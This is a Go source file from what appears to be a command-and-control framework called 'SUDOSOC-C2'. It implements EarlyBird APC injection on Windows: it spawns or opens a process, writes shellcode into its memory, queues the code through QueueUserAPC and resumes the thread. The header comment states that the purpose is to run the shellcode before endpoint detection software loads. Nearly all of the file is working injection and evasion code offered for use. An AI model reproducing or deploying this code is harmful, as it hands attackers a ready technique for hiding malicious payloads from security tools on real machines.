//go:build windows

package injection

/*
	SUDOSOC-C2 — EarlyBird APC Injection
	Copyright (C) 2026  sudosoc — Seif

	EarlyBird injects shellcode into a new process BEFORE the process's
	main thread starts executing — and crucially, before the EDR's DLL
	is loaded and notified.

	Why it evades EDRs:
	  Normal flow: CreateProcess → EDR notified → shellcode injected → flagged
	  EarlyBird:   CreateProcess SUSPENDED → shellcode injected → thread resumes
	               → shellcode runs FIRST → EDR loads AFTER

	The notification to EDRs happens via PsSetCreateProcessNotifyRoutine
	which fires AFTER the initial thread is scheduled. By queueing an APC
	before that thread runs, the shellcode executes before the EDR wakes up.

	Process:
	  1. CreateProcess with CREATE_SUSPENDED
	  2. VirtualAllocEx + WriteProcessMemory → shellcode in target
	  3. QueueUserAPC → shellcode address → main thread's APC queue
	  4. ResumeThread → thread wakes, processes APC first
	  5. Shellcode executes, establishes C2
	  6. Optional: cleanup allocations
*/

import (
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

// InjectEarlyBird spawns targetProcess in suspended state, injects shellcode,
// and resumes. The shellcode runs before the target's main() and before the EDR.
func InjectEarlyBird(targetProcess string, shellcode []byte) (uint32, error) {
	if len(shellcode) == 0 {
		return 0, fmt.Errorf("shellcode cannot be empty")
	}

	// Step 1: Create the target process in suspended state
	pi, err := createSuspendedProcess(targetProcess)
	if err != nil {
		return 0, fmt.Errorf("CreateProcess failed: %v", err)
	}
	// Ensure we clean up on failure
	defer func() {
		if pi.Process != 0 {
			windows.CloseHandle(pi.Process)
		}
		if pi.Thread != 0 {
			windows.CloseHandle(pi.Thread)
		}
	}()

	// Step 2: Allocate RWX memory in the target process
	allocated, err := virtualAllocEx(pi.Process,
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		windows.TerminateProcess(pi.Process, 0)
		return 0, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	// Step 3: Write shellcode into the allocated region
	var written uintptr
	err = windows.WriteProcessMemory(pi.Process,
		allocated,
		&shellcode[0],
		uintptr(len(shellcode)),
		&written)
	if err != nil || written != uintptr(len(shellcode)) {
		windows.VirtualFreeEx(pi.Process, allocated, 0, windows.MEM_RELEASE)
		windows.TerminateProcess(pi.Process, 0)
		return 0, fmt.Errorf("WriteProcessMemory failed: %v (wrote %d/%d)", err, written, len(shellcode))
	}

	// Step 4: Flip to RX (cleaner, avoids RWX detection)
	var oldProt uint32
	virtualProtectEx(pi.Process, allocated, uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ, &oldProt)

	// Step 5: Queue APC to the main (suspended) thread
	// When the thread resumes, it will process this APC first
	err = queueUserAPC(pi.Thread, allocated, 0, 0, 0)
	if err != nil {
		windows.VirtualFreeEx(pi.Process, allocated, 0, windows.MEM_RELEASE)
		windows.TerminateProcess(pi.Process, 0)
		return 0, fmt.Errorf("QueueUserAPC failed: %v", err)
	}

	// Step 6: Resume the main thread — shellcode runs before main()
	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		windows.TerminateProcess(pi.Process, 0)
		return 0, fmt.Errorf("ResumeThread failed: %v", err)
	}

	pid := pi.ProcessId
	// Release handles (process keeps running)
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	pi.Process = 0
	pi.Thread = 0

	return pid, nil
}

// InjectEarlyBirdExisting injects into an existing suspended thread.
func InjectEarlyBirdExisting(pid uint32, shellcode []byte) error {
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_QUERY_INFORMATION|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ,
		false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	// Find a thread in the target process
	hThread, err := findProcessThread(pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hThread)

	// Suspend it
	windows.SuspendThread(hThread)

	// Allocate + write shellcode
	allocated, err := virtualAllocEx(hProcess, 0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		windows.ResumeThread(hThread)
		return err
	}

	var written uintptr
	windows.WriteProcessMemory(hProcess, allocated, &shellcode[0], uintptr(len(shellcode)), &written)

	var oldProt uint32
	virtualProtectEx(hProcess, allocated, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProt)

	// Queue APC + resume
	queueUserAPC(hThread, allocated, 0, 0, 0)
	windows.ResumeThread(hThread)

	return nil
}

// ── Helpers ──────────────────────────────────────────────────────────

func createSuspendedProcess(exePath string) (windows.ProcessInformation, error) {
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	// Spoof command line to look innocent
	cmd, err := windows.UTF16PtrFromString(exePath)
	if err != nil {
		return pi, err
	}

	err = windows.CreateProcess(
		nil,
		cmd,
		nil, nil,
		false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil,
		&si, &pi)
	return pi, err
}

func findProcessThread(pid uint32) (windows.Handle, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	for err = windows.Thread32First(snap, &te); err == nil; err = windows.Thread32Next(snap, &te) {
		if te.OwnerProcessID == pid {
			h, err := windows.OpenThread(
				windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME,
				false, te.ThreadID)
			if err == nil {
				return h, nil
			}
		}
	}
	return 0, fmt.Errorf("no thread found for PID %d", pid)
}

// ── Syscall wrappers ──────────────────────────────────────────────

var (
	kernel32          = windows.MustLoadDLL("kernel32.dll")
	procVirtualAllocEx  = kernel32.MustFindProc("VirtualAllocEx")
	procVirtualProtectEx = kernel32.MustFindProc("VirtualProtectEx")
	procQueueUserAPC  = kernel32.MustFindProc("QueueUserAPC")
)

func virtualAllocEx(process windows.Handle, addr, size, allocType, protect uintptr) (uintptr, error) {
	r, _, e := procVirtualAllocEx.Call(uintptr(process), addr, size, allocType, protect)
	if r == 0 {
		return 0, os.NewSyscallError("VirtualAllocEx", e)
	}
	return r, nil
}

func virtualProtectEx(process windows.Handle, addr, size uintptr, newProt uint32, oldProt *uint32) {
	procVirtualProtectEx.Call(uintptr(process), addr, size, uintptr(newProt), uintptr(unsafe.Pointer(oldProt)))
}

func queueUserAPC(thread windows.Handle, apcRoutine, arg1, arg2, arg3 uintptr) error {
	r, _, e := procQueueUserAPC.Call(apcRoutine, uintptr(thread), arg1)
	if r == 0 {
		return os.NewSyscallError("QueueUserAPC", e)
	}
	return nil
}
